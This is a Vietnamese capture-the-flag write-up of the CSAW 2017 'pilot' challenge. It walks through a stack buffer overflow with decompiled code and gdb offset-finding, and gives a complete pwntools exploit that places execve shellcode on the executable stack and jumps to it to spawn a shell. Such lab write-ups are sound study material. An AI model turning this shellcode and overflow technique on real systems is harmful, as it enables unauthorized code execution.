### Pilot - CSAW 2017
* Check security file:
```
 ❯ checksec pilot
[*] '/mnt/c/Users/levan/OneDrive/Documents/CTF/NightMare/pilot'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```
* Thấy rằng file bin này cho phép thực thi lệnh trên stack.
* Source sau khi được dịch qua IDA:
```
{
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]Welcome DropShip Pilot...");
  std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  v4 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]I am your assitant A.I....");
  std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
  v5 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]I will be guiding you through the tutorial....");
  std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
  v6 = std::operator<<<std::char_traits<char>>(
         &std::cout,
         "[*]As a first step, lets learn how to land at the designated location....");
  std::ostream::operator<<(v6, &std::endl<char,std::char_traits<char>>);
  v7 = std::operator<<<std::char_traits<char>>(
         &std::cout,
         "[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...");
  std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
  v8 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]Good Luck Pilot!....");
  std::ostream::operator<<(v8, &std::endl<char,std::char_traits<char>>);
  v9 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]Location:");
  v10 = std::ostream::operator<<(v9, buf);
  std::ostream::operator<<(v10, &std::endl<char,std::char_traits<char>>);
  std::operator<<<std::char_traits<char>>(&std::cout, "[*]Command:");
  if ( read(0, buf, 0x40uLL) > 4 )
    return 0LL;
  v11 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]There are no commands....");
  std::ostream::operator<<(v11, &std::endl<char,std::char_traits<char>>);
  v12 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]Mission Failed....");
  std::ostream::operator<<(v12, &std::endl<char,std::char_traits<char>>);
  return 0xFFFFFFFFLL;
}
```

* buf được khởi tạo với kích thước 32 bytes tuy nhiên khi đọc buf lại cho phép 40 bytes, vậy ta sẽ ghi đè được ở đây.
* Chạy bin:
```
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7fffffffdae0
[*]Command:
```
* Theo thông thường khi khai thác buffer overflow thì payload sẽ bao gồm padding + địa chỉ, padding sẽ nằm trong stack, file bin này cho phép thực thi mã trên stack nên ta có thể chèn vào một shell code trong phần padding.
* Đoạn mã shell code `\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05`
* Tiếp theo cần tìm kích thước của padding để ghi đè.
* Đầu tiên nhập vào chuỗi bất kì sau đó dùng search-pattern để tìm địa chỉ chuỗi này được ghi vào trong stack:
```
gef➤  search-pattern 181818
[+] Searching '181818' in memory
[+] In '[stack]'(0x7ffffffdd000-0x7ffffffff000), permission=rwx
  0x7fffffffdae0 - 0x7fffffffdae8  →   "181818\n"
```

* Tìm địa chỉ của rip
```
gef➤  i f
Stack level 0, frame at 0x7fffffffdb10:
 rip = 0x400aee; saved rip = 0x7ffff7b99c8a
 called by frame at 0x7fffffffdbb0
 Arglist at 0x7fffffffdad8, args:
 Locals at 0x7fffffffdad8, Previous frame's sp is 0x7fffffffdb10
 Saved registers:
  rbp at 0x7fffffffdb00, rip at 0x7fffffffdb08
```

* Như vậy ta có được offset cần là:
```
>>> 0x7fffffffdb08-0x7fffffffdae0
40
```

* Vậy payload sẽ có dạng như thế này: |----(shell)---Padding------------|--Leak Address--|
* Khi được đưa vào stack, leak address sẽ overwrite lên return address, shell code sẽ nằm trong stack và thực thi. 
* file exploit:
```
from pwn import *
p = process('./pilot')

# scpt = '''
# b *0x0000000000400AEE
# '''
# gdb.attach(p, gdbscript=scpt)
print(p.recvuntil(b'[*]Location:'))

leak = str(p.recvline())
adr = int(leak.strip("b'\\n"), 16)

shell_code = b'\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05' # Shell code
payload = b''
payload += shell_code
payload += b'a'*(40-len(shell_code))	
payload += p64(adr)

p.sendline(payload)
p.interactive()
p.close()
```
